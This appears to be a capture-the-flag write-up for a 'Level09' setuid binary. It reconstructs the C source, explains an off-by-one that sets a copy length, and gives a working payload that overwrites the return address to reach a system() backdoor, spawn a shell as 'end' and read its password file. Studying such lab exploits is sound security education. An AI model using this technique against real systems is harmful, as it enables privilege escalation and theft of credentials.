# Level09 (bonus)

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char msg[140];       // offset 0   : strncpy destination (struct base)
    char username[40];   // offset 140
    int  length;         // offset 180 : number of bytes copied by strncpy
} t_msg;

void secret_backdoor(void)              // never called in the normal flow
{
    char cmd[128];
    fgets(cmd, 128, stdin);
    system(cmd);                        // runs our input as "end"
}

void set_username(t_msg *m)
{
    char local[128];
    int  i;
    puts(">: Enter your username");
    printf(">>: ");
    fgets(local, 128, stdin);
    for (i = 0; local[i] != 0 && i <= 40; i++)   // copies up to 41 bytes
        m->username[i] = local[i];               // into a 40-byte field
    printf(">: Welcome, %s", m->username);
}

void set_msg(t_msg *m)
{
    char local[1024];
    memset(local, 0, 1024);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(local, 1024, stdin);
    strncpy((char *)m, local, m->length);        // copies m->length bytes to struct base
}

void handle_msg(void)
{
    t_msg m;
    memset(m.username, 0, 40);
    m.length = 140;
    set_username(&m);
    set_msg(&m);
    puts(">: Msg sent!");
}

int main(void)
{
    puts(" ...banner l33t-m$n... ");
    handle_msg();
    return 0;
}
```

The binary is 64-bit, PIE, not stripped, and setuid **end**. `handle_msg` holds a
`t_msg` struct on its stack, fills `username` then `msg`, and an unused
`secret_backdoor()` passes its input straight to `system()`. The goal is to
redirect `handle_msg`'s return into `secret_backdoor`.

## Vulnerability

Two overflows chain together, because `set_msg` is length-limited by a field the
first overflow controls.

1. **1-byte overflow in `set_username`.** The loop copies up to 41 bytes
   (`i <= 40`) into the 40-byte `username` field. The 41st byte (index 40) lands
   exactly on `length` (offset 180). So a 41-byte username lets us **set
   `length`**.

2. **Length-controlled overflow in `set_msg`.** `strncpy((char *)m, local,
   m->length)` copies `length` bytes starting at the **struct base**. Normally
   `length = 140`, too short to reach anything. `handle_msg`'s saved return
   address sits at **offset 200** from the struct base (frame is `rbp-192`,
   return address at `rbp+8` -> `192 + 8 = 200`). By raising `length` to **202**
   via step 1, `strncpy` writes 200 bytes of padding plus 2 more, overwriting the
   low 2 bytes of the return address.

## Exploitation

The binary is PIE, so the load base is unknown. But `secret_backdoor` (offset
`0x88c`) and the current return target (`main+0x15`, offset `0xabd`) sit in the
same page: they share every byte except the low two. Overwriting only those two
bytes redirects execution to `secret_backdoor` **without knowing the base**.

ASLR is disabled, so the base is fixed. Read `secret_backdoor`'s real address in
gdb to get the exact low 2 bytes:

```sh
gdb -q /home/users/level09/level09
(gdb) break main
(gdb) run
(gdb) print secret_backdoor
   $1 = {<text ...>} 0x55555555488c <secret_backdoor>
```

Low 2 bytes = `0x48 0x8c` -> little-endian `\x8c\x48`. (The second byte is `0x48`,
not `0x08`: the base ends in `...4000`, and that `4` is part of the low 16 bits
shared with the return address, so it must be preserved.)

Payload, three input lines piped into the real binary (`cat` keeps stdin open for
the shell):

```sh
(python -c 'print "A"*40 + "\xca" + "\n" + "A"*200 + "\x8c\x48" + "\n/bin/sh"'; cat) | /home/users/level09/level09
```

- `"A"*40 + "\xca"` : 41-byte username; the 41st byte `0xca` = **202** sets `length`.
- `"A"*200 + "\x8c\x48"` : 200 bytes padding + the low 2 bytes of `secret_backdoor`.
- `/bin/sh` : read by `secret_backdoor` -> `system("/bin/sh")` as **end**.

Then:

```sh
whoami                     # end
cat /home/users/end/.pass
```

